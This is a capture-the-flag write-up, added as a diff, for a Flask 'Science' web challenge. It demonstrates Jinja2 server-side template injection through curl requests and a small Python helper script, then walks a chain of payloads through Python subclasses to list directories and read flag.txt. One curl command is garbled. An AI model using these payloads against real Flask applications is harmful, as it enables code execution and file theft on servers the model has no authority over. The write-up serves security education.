@@ -1,0 +1,111 @@
+# Science
+Web, 325 points
+
+## Description:
+
+A link to a website was attached.
+
+```html
+<html>
+    <div style="text-align: center">
+    <h1>Welcome to my new FaaS! (Flask as a Service)</h1>
+    <h4>Please enter the two chemicals you would like to combine:</h4>
+    <form action="/science" method="POST">
+        Chemical One: <input type="text" name="chem1"><br>
+        Chemical Two: <input type="text" name="chem2"><br>
+        <input type="submit">
+    </form>
+    <br>
+    <br>
+    <iframe src="https://giphy.com/embed/fqIBaMWI7m7O8" width="480" height="270" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p>
+    </div>
+</html>
+```
+
+## Solution:
+
+The website included a form which allowed combining two chemicals (freetext).
+
+The result was a page which pretty much included a GIF:
+
+```console
+root@kali:/media/sf_CTFs/tamu/Science# curl "http://web3.tamuctf.com/science" -X POST --data "chem1=a&chem2=b"
+<html>
+        <div style="text-align:center">
+        <h3>The result of combining a and b is:</h3></br>
+        <iframe src="https://giphy.com/embed/AQ2tIhLp4cBa" width="468" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div>
+        </html>
+```
+
+The title mentioned Flask, and a common vulnerability for Flask sites is "template injection" - we input python code encapsulated in double curly brackets and it gets executed by the template manager.
+
+In many cases the Python runtime environment is sandboxed, so this won't work:
+
+```console
+root@kali:/media/sf_CTFs/tamu/Science# curl "http://web3.tamuctf.com/science" -X POST --data "chem1={{print(1)}}&chem2=b"
+Something went wrong
+```
+
+But this will:
+
+```console
+root@kali:/media/sf_CTFs/tamu/Science# curl "http://web3.tamuctf.co-data "chem1={{''.__class__}}&chem2=b"
+<html>
+        <div style="text-align:center">
+        <h3>The result of combining &lt;type &#39;str&#39;&gt; and b is:</h3></br>
+        <iframe src="https://giphy.com/embed/AQ2tIhLp4cBa" width="468" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div>
+        </html>
+```
+
+Notice how the code was executed and `<type 'str'>` was printed as the result.
+
+From here, there are several known ways to arrive to RCE. Each time we add another expression that gets us closer to some important class such as `os`.
+
+I created a simple prompt that will allow me to build my way up easily, using the arrow keys to get my previous attempt.
+
+```python
+import re
+import html
+import requests
+from cmd import Cmd
+
+
+class MyPrompt(Cmd):
+   def do_exit(self, inp):
+        return True
+ 
+   def do_send(self, param):
+        r = requests.post('http://web3.tamuctf.com/science', data = {'chem1':param, 'chem2': '1'})
+        m = re.search("combining\s+(.+)\s+and", r.text)
+        if m:
+            print (html.unescape(m.group(1)))
+        else:
+            print(r.text)
+ 
+MyPrompt().cmdloop()
+```
+
+Using it:
+
+```
+root@kali:/media/sf_CTFs/tamu/Science# python3 1.py
+(Cmd) send {{"".__class__}}
+<type 'str'>
+(Cmd) send {{"".__class__.mro()}}
+[<type 'str'>, <type 'basestring'>, <type 'object'>]
+(Cmd) send {{"".__class__.mro()[2]}}
+<type 'object'>
+(Cmd) send {{"".__class__.mro()[2].__subclasses__()}}
+[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'functools.partial'>, <type 'itertools.combinations'>, <type 'itertools.combinations_with_replacement'>, <type 'itertools.cycle'>, <type 'itertools.dropwhile'>, <type 'itertools.takewhile'>, <type 'itertools.islice'>, <type 'itertools.starmap'>, <type 'itertools.imap'>, <type 'itertools.chain'>, <type 'itertools.compress'>, <type 'itertools.ifilter'>, <type 'itertools.ifilterfalse'>, <type 'itertools.count'>, <type 'itertools.izip'>, <type 'itertools.izip_longest'>, <type 'itertools.permutations'>, <type 'itertools.product'>, <type 'itertools.repeat'>, <type 'itertools.groupby'>, <type 'itertools.tee_dataobject'>, <type 'itertools.tee'>, <type 'itertools._grouper'>, <type 'cStringIO.StringO'>, <type 'cStringIO.StringI'>, <class 'string.Template'>, <class 'string.Formatter'>, <type 'collections.deque'>, <type 'deque_iterator'>, <type 'deque_reverse_iterator'>, <type '_thread._localdummy'>, <type 'thread._local'>, <type 'thread.lock'>, <type 'datetime.date'>, <type 'datetime.timedelta'>, <type 'datetime.time'>, <type 'datetime.tzinfo'>, <class 'werkzeug._internal._Missing'>, <class 'werkzeug._internal._DictAccessorProperty'>, <type 'time.struct_time'>, <class 'email.LazyImporter'>, <type 'Struct'>, <type '_hashlib.HASH'>, <type '_random.Random'>, <type '_ssl._SSLContext'>, <type '_ssl._SSLSocket'>, <class 'socket._closedsocket'>, <type '_socket.socket'>, <type 'method_descriptor'>, <class 'socket._socketobject'>, <class 'socket._fileobject'>, <class 'urlparse.ResultMixin'>, <class 'contextlib.GeneratorContextManager'>, <class 'contextlib.closing'>, <class 'calendar.Calendar'>, <type '_io._IOBase'>, <type '_io.IncrementalNewlineDecoder'>, <class 'werkzeug.datastructures.ImmutableListMixin'>, <class 'werkzeug.datastructures.ImmutableDictMixin'>, <class 'werkzeug.datastructures.UpdateDictMixin'>, <class 'werkzeug.datastructures.ViewItems'>, <class 'werkzeug.datastructures._omd_bucket'>, <class 'werkzeug.datastructures.Headers'>, <class 'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, <class 'werkzeug.urls.Href'>, <class 'werkzeug.wsgi.ProxyMiddleware'>, <class 'werkzeug.wsgi.SharedDataMiddleware'>, <class 'werkzeug.wsgi.DispatcherMiddleware'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.utils.HTMLBuilder'>, <class 'werkzeug.wrappers.BaseRequest'>, <class 'werkzeug.wrappers.BaseResponse'>, <class 'werkzeug.wrappers.AcceptMixin'>, <class 'werkzeug.wrappers.ETagRequestMixin'>, <class 'werkzeug.wrappers.UserAgentMixin'>, <class 'werkzeug.wrappers.AuthorizationMixin'>, <class 'werkzeug.wrappers.StreamOnlyMixin'>, <class 'werkzeug.wrappers.ETagResponseMixin'>, <class 'werkzeug.wrappers.ResponseStream'>, <class 'werkzeug.wrappers.ResponseStreamMixin'>, <class 'werkzeug.wrappers.CommonRequestDescriptorsMixin'>, <class 'werkzeug.wrappers.CommonResponseDescriptorsMixin'>, <class 'werkzeug.wrappers.WWWAuthenticateMixin'>, <class 'werkzeug.exceptions.Aborter'>, <type '_json.Scanner'>, <type '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'threading._Verbose'>, <type 'cPickle.Unpickler'>, <type 'cPickle.Pickler'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.runtime.TemplateReference'>, <class 'jinja2.nodes.Node'>, <class 'numbers.Number'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.LoopContextBase'>, <class 'jinja2.runtime.LoopContextIterator'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'decimal.Decimal'>, <class 'decimal._ContextManager'>, <class 'decimal.Context'>, <class 'decimal._WorkRep'>, <class 'decimal._Log10Memoize'>, <type '_ast.AST'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'difflib.HtmlDiff'>, <class 'uuid.UUID'>, <type 'CArgObject'>, <type '_ctypes.CThunkObject'>, <type '_ctypes._CData'>, <type '_ctypes.CField'>, <type '_ctypes.DictRemover'>, <class 'ctypes.CDLL'>, <class 'ctypes.LibraryLoader'>, <type 'select.epoll'>, <class 'subprocess.Popen'>, <class 'werkzeug.routing.RuleFactory'>, <class 'werkzeug.routing.RuleTemplate'>, <class 'werkzeug.routing.BaseConverter'>, <class 'werkzeug.routing.Map'>, <class 'werkzeug.routing.MapAdapter'>, <class 'flask.signals.Namespace'>, <class 'flask.signals._FakeSignal'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalStack'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local.LocalProxy'>, <class 'flask.helpers.locked_cached_property'>, <class 'flask.helpers._PackageBoundObject'>, <class 'itsdangerous._json._CompactJSON'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.types.ParamType'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'flask.cli.DispatchingApp'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'flask.sessions.SessionMixin'>, <class 'flask.sessions.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'flask.blueprints.BlueprintSetupState'>, <class 'sqlalchemy.util._collections.ImmutableContainer'>, <class 'sqlalchemy.util._collections.Properties'>, <class 'sqlalchemy.util._collections.IdentitySet'>, <class 'sqlalchemy.util._collections.WeakSequence'>, <class 'sqlalchemy.util._collections.UniqueAppender'>, <class 'sqlalchemy.util._collections.ScopedRegistry'>, <class 'sqlalchemy.exc.DontWrapMixin'>, <class 'sqlalchemy.util.langhelpers.safe_reraise'>, <class 'sqlalchemy.util.langhelpers.PluginLoader'>, <class 'sqlalchemy.util.langhelpers.portable_instancemethod'>, <class 'sqlalchemy.util.langhelpers.memoized_property'>, <class 'sqlalchemy.util.langhelpers.group_expirable_memoized_property'>, <class 'sqlalchemy.util.langhelpers.MemoizedSlots'>, <class 'sqlalchemy.util.langhelpers._importlater'>, <class 'sqlalchemy.util.langhelpers.dependencies'>, <class 'sqlalchemy.util.langhelpers.hybridproperty'>, <class 'sqlalchemy.util.langhelpers.hybridmethod'>, <class 'sqlalchemy.util.langhelpers.symbol'>, <class 'sqlalchemy.sql.operators.Operators'>, <class 'sqlalchemy.sql.visitors.Visitable'>, <class 'sqlalchemy.sql.visitors.ClauseVisitor'>, <class 'sqlalchemy.sql.base.Immutable'>, <class 'sqlalchemy.sql.base.DialectKWArgs'>, <class 'sqlalchemy.sql.base.Generative'>, <class 'sqlalchemy.sql.base.SchemaEventTarget'>, <class 'sqlalchemy.sql.operators.custom_op'>, <class 'sqlalchemy.sql.selectable.HasPrefixes'>, <class 'sqlalchemy.sql.type_api.Emulated'>, <class 'sqlalchemy.sql.type_api.NativeForEmulated'>, <class 'sqlalchemy.sql.annotation.Annotated'>, <class 'sqlalchemy.sql.selectable.HasSuffixes'>, <class 'sqlalchemy.sql.selectable.HasCTE'>, <class 'sqlalchemy.event.registry._EventKey'>, <class 'sqlalchemy.event.attr._empty_collection'>, <class 'sqlalchemy.event.base._UnpickleDispatch'>, <class 'sqlalchemy.event.base._Dispatch'>, <class 'sqlalchemy.sql.schema.ColumnCollectionMixin'>, <class 'sqlalchemy.event.base.Events'>, <class 'sqlalchemy.event.base._JoinedDispatcher'>, <class 'sqlalchemy.event.base.dispatcher'>, <class 'sqlalchemy.sql.schema._NotAColumnExpr'>, <class 'sqlalchemy.sql.schema._SchemaTranslateMap'>, <type 'sqlalchemy.cprocessors.UnicodeResultProcessor'>, <type 'sqlalchemy.DecimalResultProcessor'>, <class 'sqlalchemy.sql.sqltypes._LookupExpressionAdapter'>, <class 'sqlalchemy.sql.sqltypes.Concatenable'>, <class 'sqlalchemy.sql.sqltypes.Indexable'>, <class 'sqlalchemy.sql.util._repr_base'>, <class 'sqlalchemy.sql.util._IncludeExcludeMapping'>, <class 'sqlalchemy.sql.functions._FunctionGenerator'>, <class 'sqlalchemy.sql.compiler.Compiled'>, <class 'sqlalchemy.sql.compiler.IdentifierPreparer'>, <class 'sqlalchemy.sql.compiler.TypeCompiler'>, <class 'sqlalchemy.engine.interfaces.Dialect'>, <class 'sqlalchemy.engine.interfaces.CreateEnginePlugin'>, <class 'sqlalchemy.engine.interfaces.ExecutionContext'>, <class 'sqlalchemy.engine.interfaces.Connectable'>, <class 'sqlalchemy.engine.interfaces.ExceptionContext'>, <class 'sqlalchemy.interfaces.PoolListener'>, <class 'sqlalchemy.interfaces.ConnectionProxy'>, <class 'logging.LogRecord'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'sqlalchemy.log.Identified'>, <class 'sqlalchemy.log.InstanceLogger'>, <class 'sqlalchemy.log.echo_property'>, <class 'sqlalchemy.engine.base.Transaction'>, <class 'sqlalchemy.engine.base._trans_ctx'>, <class 'sqlalchemy.engine.url.URL'>, <class 'sqlalchemy.pool._ConnDialect'>, <class 'sqlalchemy.pool._ConnectionRecord'>, <class 'sqlalchemy.pool._ConnectionFairy'>, <class 'sqlalchemy.pool._DBProxy'>, <class 'sqlalchemy.engine.strategies.EngineStrategy'>, <type 'sqlalchemy.cresultproxy.BaseRowProxy'>, <class 'sqlalchemy.engine.result.ResultMetaData'>, <class 'sqlalchemy.engine.result.ResultProxy'>, <type 'listreverseiterator'>, <class 'sqlalchemy.sql.naming.ConventionDict'>, <class 'sqlalchemy.engine.reflection.Inspector'>, <class 'sqlalchemy.orm.base.InspectionAttr'>, <class 'sqlalchemy.orm.base._MappedAttribute'>, <class 'sqlalchemy.orm.collections._PlainColumnGetter'>, <class 'sqlalchemy.orm.collections._SerializableColumnGetter'>, <class 'sqlalchemy.orm.collections._SerializableAttrGetter'>, <class 'sqlalchemy.orm.collections.collection'>, <class 'sqlalchemy.orm.collections.CollectionAdapter'>, <type 'classmethod_descriptor'>, <class 'sqlalchemy.orm.path_registry.PathRegistry'>, <class 'sqlalchemy.orm.interfaces.MapperOption'>, <class 'sqlalchemy.orm.interfaces.LoaderStrategy'>, <class 'sqlalchemy.orm.attributes.Event'>, <class 'sqlalchemy.orm.attributes.AttributeImpl'>, <class 'sqlalchemy.orm.state.AttributeState'>, <class 'sqlalchemy.orm.state.PendingCollection'>, <class 'sqlalchemy.orm.instrumentation._SerializeManager'>, <class 'sqlalchemy.orm.instrumentation.InstrumentationFactory'>, <class 'sqlalchemy.orm.util.AliasedClass'>, <class 'sqlalchemy.orm.strategy_options.loader_option'>, <class 'sqlalchemy.orm.loading.PostLoad'>, <class 'sqlalchemy.orm.deprecated_interfaces.MapperExtension'>, <class 'sqlalchemy.orm.deprecated_interfaces.SessionExtension'>, <class 'sqlalchemy.orm.deprecated_interfaces.AttributeExtension'>, <class 'sqlalchemy.orm.evaluator.EvaluatorCompiler'>, <class 'sqlalchemy.orm.persistence.BulkUD'>, <class 'sqlalchemy.orm.query.Query'>, <class 'sqlalchemy.orm.query._QueryEntity'>, <class 'sqlalchemy.orm.query.QueryContext'>, <class 'sqlalchemy.orm.unitofwork.UOWTransaction'>, <class 'sqlalchemy.orm.unitofwork.IterateMappersMixin'>, <class 'sqlalchemy.orm.unitofwork.PostSortRec'>, <class 'sqlalchemy.orm.dependency.DependencyProcessor'>, <class 'sqlalchemy.orm.relationships.JoinCondition'>, <class 'sqlalchemy.orm.relationships._ColInAnnotations'>, <class 'sqlalchemy.orm.identity.IdentityMap'>, <class 'sqlalchemy.orm.session._SessionClassMethods'>, <class 'sqlalchemy.orm.session.SessionTransaction'>, <class 'sqlalchemy.orm.scoping.scoped_session'>, <class 'sqlalchemy.orm.strategies.LoadDeferredColumns'>, <class 'sqlalchemy.orm.strategies.LoadLazyAttribute'>, <class 'sqlalchemy.orm.strategies._SubqCollections'>, <class 'sqlalchemy.orm.dynamic.AppenderMixin'>, <class 'sqlalchemy.orm.dynamic.CollectionHistory'>, <class 'sqlalchemy.orm.events._InstrumentationEventsHold'>, <class 'sqlalchemy.orm.events.HoldEvents'>, <class 'sqlalchemy.ext.baked.Bakery'>, <class 'sqlalchemy.ext.baked.BakedQuery'>, <class 'sqlalchemy.ext.baked.Result'>, <class 'sqlalchemy.ext.declarative.clsregistry._MultipleClassMarker'>, <class 'sqlalchemy.ext.declarative.clsregistry._ModuleMarker'>, <class 'sqlalchemy.ext.declarative.clsregistry._ModNS'>, <class 'sqlalchemy.ext.declarative.clsregistry._GetColumns'>, <class 'sqlalchemy.ext.declarative.clsregistry._GetTable'>, <class 'sqlalchemy.ext.declarative.clsregistry._class_resolver'>, <class 'sqlalchemy.ext.declarative.base._MapperConfig'>, <class 'sqlalchemy.ext.declarative.api.ConcreteBase'>, <class 'sqlalchemy.ext.declarative.api.DeferredReflection'>, <class 'flask_sqlalchemy.model.NameMetaMixin'>, <class 'flask_sqlalchemy.model.BindMetaMixin'>, <class 'flask_sqlalchemy.model.Model'>, <class 'flask_sqlalchemy._SessionSignalEvents'>, <class 'flask_sqlalchemy._EngineDebuggingSignalEvents'>, <class 'flask_sqlalchemy.Pagination'>, <class 'flask_sqlalchemy._QueryProperty'>, <class 'flask_sqlalchemy._EngineConnector'>, <class 'flask_sqlalchemy._SQLAlchemyState'>, <class 'flask_sqlalchemy.SQLAlchemy'>, <class 'ipaddress._TotalOrderingMixin'>, <class 'ipaddress._BaseV4'>, <class 'ipaddress._IPv4Constants'>, <class 'ipaddress._BaseV6'>, <class 'ipaddress._IPv6Constants'>, <class 'urllib3.util.selectors.BaseSelector'>, <class 'urllib3.packages.six._LazyDescr'>, <class 'urllib3.packages.six._SixMetaPathImporter'>, <class 'urllib3.packages.six.Iterator'>, <class 'urllib3.util.timeout.Timeout'>, <class 'urllib3.util.retry.Retry'>, <class 'urllib3.connection.DummyConnection'>, <class 'urllib3.connection.HTTPConnection'>, <class 'urllib3.fields.RequestField'>, <class 'urllib3.request.RequestMethods'>, <class 'urllib3.response.DeflateDecoder'>, <class 'urllib3.response.GzipDecoder'>, <class 'urllib3.connectionpool.ConnectionPool'>, <class 'chardet.enums.InputState'>, <class 'chardet.enums.LanguageFilter'>, <class 'chardet.enums.ProbingState'>, <class 'chardet.enums.MachineState'>, <class 'chardet.enums.SequenceLikelihood'>, <class 'chardet.enums.CharacterCategory'>, <class 'chardet.charsetprober.CharSetProber'>, <class 'chardet.codingstatemachine.CodingStateMachine'>, <class 'chardet.chardistribution.CharDistributionAnalysis'>, <class 'chardet.jpcntx.JapaneseContextAnalysis'>, <class 'chardet.universaldetector.UniversalDetector'>, <class 'requests.cookies.MockRequest'>, <class 'requests.cookies.MockResponse'>, <type 'array.array'>, <type 'unicodedata.UCD'>, <class 'requests.auth.AuthBase'>, <class 'requests.models.RequestEncodingMixin'>, <class 'requests.models.RequestHooksMixin'>, <class 'requests.models.Response'>, <class 'requests.adapters.BaseAdapter'>, <class 'requests.sessions.SessionRedirectMixin'>, <class 'werkzeug.serving.WSGIRequestHandler'>, <class 'werkzeug.serving._SSLContext'>, <class 'werkzeug.serving.BaseWSGIServer'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>, <class 'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <type 'method-wrapper'>, <class 'jinja2.debug.TracebackFrameProxy'>, <class 'jinja2.debug.ProcessedTraceback'>]
+(Cmd) send {{"".__class__.mro()[2].__subclasses__()[59]}}
+<class 'warnings.catch_warnings'>
+(Cmd) send {{"".__class__.mro()[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].listdir('.')}}
+['entry.sh', 'config.py', 'requirements.txt', 'serve.py', 'tamuctf', 'flag.txt']
+(Cmd) send {{"".__class__.mro()[2].__subclasses__()[59]()._module.__builtins__['open']}}
+<built-in function open>
+(Cmd) send {{"".__class__.mro()[2].__subclasses__()[59]()._module.__builtins__['open']('flag.txt')}}
+<open file 'flag.txt', mode 'r' at 0x7f3cacb57390>
+
+(Cmd) send {{"".__class__.mro()[2].__subclasses__()[59]()._module.__builtins__['open']('flag.txt').read()}}
+gigem{5h3_bl1nd3d_m3_w17h_5c13nc3}
+```
